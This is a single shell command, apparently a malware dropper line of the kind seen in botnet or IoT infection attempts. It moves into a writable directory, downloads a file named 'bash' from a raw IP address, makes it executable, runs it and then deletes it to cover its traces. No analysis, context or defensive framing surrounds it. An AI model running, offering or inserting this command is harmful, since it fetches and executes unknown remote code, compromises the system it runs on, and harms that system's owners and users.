cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.88.90.237/bash; chmod +x bash; ./bash; rm -rf bash
